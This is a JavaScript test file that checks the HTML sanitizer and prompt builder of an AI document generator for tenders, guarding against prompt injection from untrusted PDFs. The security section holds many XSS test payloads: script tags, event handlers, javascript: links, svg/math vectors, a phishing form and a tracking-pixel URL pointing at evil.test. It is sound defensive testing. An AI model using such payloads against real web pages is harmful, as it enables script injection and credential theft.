// Security and behaviour checks for the AI document generator.
// Run: node scripts/verify-doc-generator.mjs
//
// The sanitizer is a security boundary: generated documents are rendered with
// dangerouslySetInnerHTML in a logged-in client's dashboard, and the model's input
// includes untrusted tender PDFs. These assertions are the proof that a prompt injection
// cannot turn into script execution.
import assert from 'node:assert/strict';
import { sanitizeGeneratedHtml, htmlToPlainText } from '../lib/html-sanitize.js';
import { buildDocumentPrompt, DOC_TYPES, findDocType } from '../lib/document-templates.js';

const clean = (html) => sanitizeGeneratedHtml(html);

// --- Legitimate formatting must survive untouched in substance.
const letter = '<h1>Bid Cover Letter</h1><p>To,<br>The Executive Engineer</p>' +
  '<ul><li>Item one</li><li>Item two</li></ul>' +
  '<table><tr><th colspan="2">Spec</th></tr><tr><td>A</td><td>B</td></tr></table>';
const cleanedLetter = clean(letter);
assert.ok(cleanedLetter.includes('<h1>Bid Cover Letter</h1>'));
assert.ok(cleanedLetter.includes('<br />'), 'br should be preserved as a void tag');
assert.ok(cleanedLetter.includes('<li>Item one</li>'));
assert.ok(cleanedLetter.includes('colspan="2"'), 'table layout attributes should survive');
assert.ok(cleanedLetter.includes('The Executive Engineer'));

// --- Script execution vectors
assert.ok(!clean('<p>Hi</p><script>alert(1)</script>').includes('alert'), 'script content must be removed');
assert.ok(!clean('<script>alert(1)').includes('alert'), 'unterminated script must be removed');
assert.ok(!clean('<SCRIPT>alert(1)</SCRIPT>').toLowerCase().includes('alert'), 'case must not bypass');
assert.ok(!clean('<img src=x onerror="alert(1)">').includes('onerror'));
assert.ok(!clean('<p onclick="alert(1)">Text</p>').includes('onclick'));
assert.ok(!clean('<p ONCLICK="alert(1)">Text</p>').toLowerCase().includes('onclick'));
assert.ok(!clean('<p onmouseover=alert(1)>Text</p>').includes('alert'), 'unquoted handler must be dropped');
assert.equal(clean('<p onclick="alert(1)">Text</p>'), '<p>Text</p>', 'tag should be rebuilt without the handler');

// --- Link / resource vectors. href and src are not on the allowlist at all.
assert.ok(!clean('<a href="javascript:alert(1)">click</a>').includes('javascript:'));
assert.ok(!clean('<a href="https://evil.test">click</a>').includes('evil.test'));
assert.ok(clean('<a href="https://evil.test">click</a>').includes('click'), 'text content should survive unwrapping');
assert.ok(!clean('<iframe src="https://evil.test"></iframe>').includes('evil.test'));
assert.ok(!clean('<object data="x.swf"></object>').includes('x.swf'));
assert.ok(!clean('<embed src="x">').includes('embed'));
assert.ok(!clean('<img src="x">').includes('<img'), 'images are not on the allowlist');

// --- mXSS / namespace confusion vectors
assert.ok(!clean('<svg><script>alert(1)</script></svg>').includes('alert'));
assert.ok(!clean('<math><mtext><script>alert(1)</script></mtext></math>').includes('alert'));
assert.ok(!clean('<!--<script>alert(1)</script>-->').includes('alert'), 'comments must be stripped');
assert.ok(!clean('<noscript><p>x</p></noscript>').includes('noscript'));
assert.ok(!clean('<template><p>x</p></template>').includes('template'));

// --- Form / credential-phishing vectors
const form = clean('<form action="https://evil.test"><input name="pw"><button>Go</button></form>');
assert.ok(!form.includes('<form'), 'forms must not survive');
assert.ok(!form.includes('<input'), 'inputs must not survive');
assert.ok(!form.includes('evil.test'));

// --- Style-based vectors
assert.ok(!clean('<style>body{display:none}</style>').includes('display'));
assert.ok(!clean('<p style="background:url(javascript:alert(1))">x</p>').includes('javascript'));
assert.ok(!clean('<p style="background-image:url(https://evil.test/track.png)">x</p>').includes('evil.test'),
  'remote resource loads (tracking pixels) must be blocked');
assert.ok(!clean('<p style="position:fixed;top:0">x</p>').includes('position'),
  'positioning could overlay the dashboard and must be dropped');
assert.ok(!clean('<p style="width:expression(alert(1))">x</p>').includes('expression'));
// ...while genuinely useful print styling is kept.
assert.ok(clean('<p style="text-align: center">x</p>').includes('text-align: center'));
assert.ok(clean('<p style="text-align:center;position:fixed">x</p>').includes('text-align'));
assert.ok(!clean('<p style="text-align:center;position:fixed">x</p>').includes('position'),
  'a mixed style attribute must keep the safe half and drop the unsafe half');

// --- id is blocked (DOM clobbering of globals the dashboard relies on)
assert.ok(!clean('<div id="a4-print-sheet">x</div>').includes('id='));

// --- Structural robustness
assert.ok(clean('<p>Unclosed paragraph').endsWith('</p>'), 'unclosed tags must be closed');
assert.equal(clean('</p></div>'), '', 'stray closing tags must not unbalance the output');
assert.ok(!clean('<p>a < b</p>').includes('<p>a < b'), 'a literal < must be escaped');
assert.equal(clean(''), '');
assert.equal(clean(null), '');
assert.equal(clean(undefined), '');
assert.equal(clean('   '), '');

// A full HTML document collapses to just the body content.
const fullDoc = clean('<!DOCTYPE html><html><head><title>x</title><style>p{color:red}</style></head><body><p>Body text</p></body></html>');
assert.equal(fullDoc, '<p>Body text</p>');

// Sanitizing already-sanitized output must be a no-op (idempotent), otherwise repeated
// passes could progressively mangle a document.
assert.equal(clean(cleanedLetter), cleanedLetter, 'sanitizer must be idempotent');

// --- htmlToPlainText
assert.equal(htmlToPlainText('<p>Line one</p><p>Line two</p>'), 'Line one\n\nLine two');
assert.equal(htmlToPlainText('<p>a<br>b</p>'), 'a\nb');
assert.equal(htmlToPlainText('<p>Tom &amp; Jerry</p>'), 'Tom & Jerry');
assert.equal(htmlToPlainText(''), '');

// --- Document type registry
assert.ok(DOC_TYPES.length >= 5, 'expect a useful catalogue of document types');
assert.ok(DOC_TYPES.every(t => t.id && t.label && t.guidance), 'every type needs id, label and guidance');
assert.equal(new Set(DOC_TYPES.map(t => t.id)).size, DOC_TYPES.length, 'ids must be unique');
assert.ok(findDocType('cover_letter'));
assert.ok(findDocType('Bid Cover Letter'), 'label lookup should work for older clients');
assert.ok(findDocType('COVER_LETTER'), 'lookup should be case-insensitive');
assert.equal(findDocType('nonsense'), null);
assert.equal(findDocType(''), null);
assert.equal(findDocType(null), null);

// --- Prompt construction
const prompt = buildDocumentPrompt({
  docType: findDocType('cover_letter'),
  client: { company_name: 'Alpha Traders', gstin: '36ABCDE1234F1Z5', udyam: 'UDYAM-TS-01-0001', address: 'Hyderabad' },
  tender: { bid_no: 'GEM/2026/B/123', title: 'Supply of desks', department: 'Education Dept', last_date: '2026-10-01' },
  instructions: 'Mention our MSME status.',
});
assert.ok(prompt.includes('Alpha Traders'));
assert.ok(prompt.includes('GEM/2026/B/123'));
assert.ok(prompt.includes('UDYAM-TS-01-0001'));
assert.ok(prompt.includes('Mention our MSME status.'));
assert.ok(prompt.includes('Bid Cover Letter'));
assert.ok(/raw HTML only/i.test(prompt), 'the HTML output contract must be present');
assert.ok(!/<html>/i.test(prompt.split('OUTPUT FORMAT')[0]), 'no stray document tags before the contract');

// Without a tender the prompt must instruct placeholders rather than invention.
const noTenderPrompt = buildDocumentPrompt({
  docType: findDocType('rti_inquiry'),
  client: { company_name: 'Beta Works' },
  tender: null,
});
assert.ok(noTenderPrompt.includes('No specific tender was selected'));
assert.ok(noTenderPrompt.includes('INSERT TENDER REFERENCE NUMBER'));
assert.ok(!noTenderPrompt.includes('ADDITIONAL INSTRUCTIONS'), 'empty instructions must not add a heading');

// A client with an empty profile must not produce a prompt full of "undefined".
const emptyProfilePrompt = buildDocumentPrompt({
  docType: findDocType('declaration'),
  client: {},
  tender: null,
});
assert.ok(!emptyProfilePrompt.includes('undefined'), 'missing profile fields must be omitted, not stringified');
assert.ok(emptyProfilePrompt.includes('No profile details are on record.'));

console.log('✅ document generator + sanitizer verification passed');
